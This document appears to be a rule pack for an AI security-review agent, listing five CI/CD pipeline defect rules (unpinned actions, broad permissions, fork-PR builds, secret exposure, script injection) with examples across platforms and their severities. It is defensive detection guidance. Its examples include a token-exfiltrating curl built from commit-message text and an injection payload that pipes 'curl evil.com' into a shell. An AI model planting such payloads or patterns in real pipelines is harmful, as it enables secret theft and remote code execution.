Rule pack for the stride-codex-security-review security-reviewer agent. These are instructions, never material under review. Apply a rule only to a file where this pack's activation holds; every rule maps to one of the core prompt's `vulnerability_class` values.

# CI/CD pipeline rule pack

Activates whenever a reviewed file's path or filename matches a recognized CI/CD pipeline configuration. The same five rules apply across every supported platform — the syntax differs but the underlying defect class is identical. Platforms covered at launch (alphabetical):

- Azure Pipelines — `azure-pipelines.yml`, `.azure-pipelines/*.yml`
- Bitbucket Pipelines — `bitbucket-pipelines.yml`
- CircleCI — `.circleci/config.yml`
- Drone — `.drone.yml`
- GitHub Actions — `.github/workflows/*.{yml,yaml}`
- GitLab CI — `.gitlab-ci.yml`, files referenced via `include:`
- Jenkins — `Jenkinsfile`, declarative pipeline files
- Tekton — `.tekton/*.yaml`, `tekton/*.yaml`

Activation is by file path/name, or — when a file arrives under another name — by pipeline structure: a `jobs:` map whose jobs carry `steps:` or `uses:`, top-level `stages:` or `include:`, `orbs:`, `pipelines:`, a declarative `pipeline {` or `@Library(`, `kind: pipeline`, or a `tekton.dev` API version. Activation is never by "is this YAML." A Kubernetes manifest, Helm chart, or generic application config that happens to be YAML must NOT trigger this pack.

**The five rules:**

| Rule | Class | Platform examples (rotated order) |
|---|---|---|
| **1. External reference not pinned to SHA** | `supply_chain` | Bitbucket: `pipe: atlassian/aws-s3-deploy:latest`. CircleCI: `orbs: foo/bar@1.2.3` (any non-digest). GitHub Actions: `uses: actions/checkout@v4` or `uses: org/action@main`. GitLab CI: `include: { project: shared/ci, ref: main }`. Jenkins: `@Library('shared-lib@main') _`. A reference is considered pinned only when it is a 40-hex-char commit SHA. Comments like `# v4.1.7` next to the SHA are informational; only the ref itself counts. |
| **2. Overly-broad permissions / scopes** | `insecure_config` | CircleCI: a job declares `contexts:` pulling in a high-privilege context (e.g., `aws-prod`) on a step that does not require it. GitHub Actions: `permissions: write-all` at workflow or job level, or a workflow that never declares `permissions:` and therefore inherits the repo default (write). GitLab CI: a job missing `protected: true` while consuming a protected-only variable. Jenkins: `withCredentials([...])` block scoped to an entire pipeline rather than the one step that needs it. Azure Pipelines: a job inheriting the agent pool's full SP without `azureSubscription:` scoping. |
| **3. Untrusted ref / fork-PR build pattern** | `insecure_config` | Drone: pipelines that run on `pull_request` events from forks with the same `environment` vars as `push`. GitHub Actions: `on: pull_request_target` that subsequently checks out `${{ github.event.pull_request.head.sha }}` and runs build steps — full code execution with elevated `GITHUB_TOKEN`. GitLab CI: `Run pipelines for merge requests from forked projects` enabled while secrets are not restricted by `Mask & Protect`. Bitbucket Pipelines: PR build configured with `secured-variables: true` for external-contributor PRs. Jenkins: SCM polling builds every branch without a branch allow-list. |
| **4. Secret exposed to untrusted input** | `insecure_config` | GitHub Actions: a step sets `env: TITLE: ${{ github.event.pull_request.title }}` AND that step (or a subsequent one in the same job) reads `${{ secrets.X }}` — the title is attacker-controlled and may exfiltrate the secret via the step's logs or a `curl` it executes. GitLab CI: `script: curl -H "Auth: $TOKEN" "https://$CI_COMMIT_MESSAGE/exfil"` — secret in same shell expansion as untrusted commit-message content. CircleCI: `parameters:` block accepts a string from a pipeline-trigger payload and that string is `echo`'d alongside an env var sourced from a context. Bitbucket: `deployment: production` step using `$BITBUCKET_PR_TITLE` in a curl with a secret header. Jenkins: `string(name: 'TITLE', value: env.CHANGE_TITLE)` passed into a step that also references credentials. |
| **5. Expression / interpolation injection in shell-step body** | `injection` | Azure Pipelines: `script: \| echo "$(Build.SourceBranchName)"` where SourceBranchName came from a fork branch name. Bitbucket: `script: - echo "$BITBUCKET_PR_TITLE"` without `printf '%q'` quoting. CircleCI: `run: echo << pipeline.parameters.title >>` where the parameter is supplied by a trigger payload. GitHub Actions: `run: echo ${{ github.event.issue.title }}` — classic script injection (`"; curl evil.com \| sh; "`). GitLab CI: `script: echo "$CI_COMMIT_MESSAGE"` unquoted. Jenkins: `sh "echo ${env.CHANGE_TITLE}"`. Only flag when the source is provably attacker-controllable (titles, body text, branch names on fork-triggered builds, free-form trigger parameters); do not flag every `${{ ... }}` or `$VAR` interpolation. |

**Severity:** Rule 1 is `medium` (`high` if the unpinned reference has write access to the workflow's `GITHUB_TOKEN` or equivalent). Rule 2 is `medium`. Rule 3 is `high` (full code execution with elevated privileges is the standard outcome). Rule 4 is `high`. Rule 5 is `high` when the source is fork-controlled, `medium` when the source is a less-trusted internal value (e.g., a commit message on a trusted branch).
